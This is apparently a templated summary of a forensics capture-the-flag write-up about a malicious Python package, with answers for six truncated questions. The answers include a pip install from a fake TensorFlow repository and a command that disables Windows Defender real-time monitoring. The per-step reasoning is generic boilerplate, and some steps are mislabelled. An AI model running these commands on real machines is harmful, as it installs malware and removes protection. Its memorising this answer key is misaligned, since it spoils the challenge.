# Malicious PyPi Lab

## Case Metadata

- Category: `Endpoint Forensics`
- Platform: `CyberDefenders`
- Difficulty: `Medium`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/cyber_defenders_malicious_pypi_lab.pdf`

## Why This Case Matters

Use this case as a Endpoint Forensics reference for disk-image, registry, windows-events challenges.

## Input Signals

- Artifacts: disk-image, registry, windows-events
- Tools: evtxecmd, mftecmd, pecmd, registry-explorer, virustotal
- Techniques: browser-forensics, cti-enrichment, http-analysis, malware-dynamic, registry-forensics, timeline-analysis, windows-event-analysis

## First-Principles Route

- Start from artifact inventory: event logs, registry hives, browser data, file system timelines, memory, and application databases.
- Build a timeline around the suspicious user, process, file path, login, persistence item, or network connection.
- Correlate logs with file and registry evidence before trusting one artifact alone.
- Extract concrete indicators such as process names, command lines, hashes, timestamps, users, and persistence locations.

## Solve Thinking

### Step 1: system security. Can you identify the specific command used for this download?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use evtxecmd, pecmd, registry-explorer, virustotal to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: evtxecmd, pecmd, registry-explorer, virustotal
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use evtxecmd, pecmd, registry-explorer, virustotal to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `pip install git+https://github.com/a1l4m/TensorFlow.git#egg=TensorFlow`

### Step 2: an attacker. What was this command?

- Route type: `event-log correlation`
- Why: Event-log cases should be solved by field correlation, not by reading logs chronologically.
- Probe: Use evtxecmd, pecmd, registry-explorer, virustotal to search the relevant event IDs and correlate user, process, host, and timestamp fields.
- Tools: evtxecmd, pecmd, registry-explorer, virustotal
- Reasoning chain:
  - Recognize the goal as event-log correlation.
  - Use evtxecmd, pecmd, registry-explorer, virustotal to search the relevant event IDs and correlate user, process, host, and timestamp fields.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `Set-MpPreference -DisableRealtimeMonitoring $true`

### Step 3: changes to the security settings that led to the disabling of Windows Defender?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use evtxecmd, pecmd, registry-explorer, virustotal to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: evtxecmd, pecmd, registry-explorer, virustotal
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use evtxecmd, pecmd, registry-explorer, virustotal to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `2024-02-26 12:22`

### Step 4: the MD5 hash of this file, indicating its unique identity?

- Route type: `file metadata extraction`
- Why: When traffic yields a file, recover the object and inspect metadata before treating visible content as the answer.
- Probe: Use evtxecmd, mftecmd, pecmd, registry-explorer to recover or open the referenced file and inspect its metadata fields.
- Tools: evtxecmd, mftecmd, pecmd, registry-explorer, virustotal
- Reasoning chain:
  - Recognize the goal as file metadata extraction.
  - Use evtxecmd, mftecmd, pecmd, registry-explorer to recover or open the referenced file and inspect its metadata fields.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `23AADF3C98745CF293BFF6B1B0980429`

### Step 5: port was used for this communication?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use evtxecmd, pecmd, registry-explorer, virustotal to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: evtxecmd, pecmd, registry-explorer, virustotal
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use evtxecmd, pecmd, registry-explorer, virustotal to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `8888`

### Step 6: operation. When was it first executed?

- Route type: `timeline reconstruction`
- Why: Timeline questions should be answered from normalized artifact timestamps with timezone assumptions recorded.
- Probe: Use evtxecmd, pecmd, registry-explorer, virustotal to align timestamps and identify the event that satisfies the question.
- Tools: evtxecmd, pecmd, registry-explorer, virustotal
- Reasoning chain:
  - Recognize the goal as timeline reconstruction.
  - Use evtxecmd, pecmd, registry-explorer, virustotal to align timestamps and identify the event that satisfies the question.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `2024-02-26 12:42`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
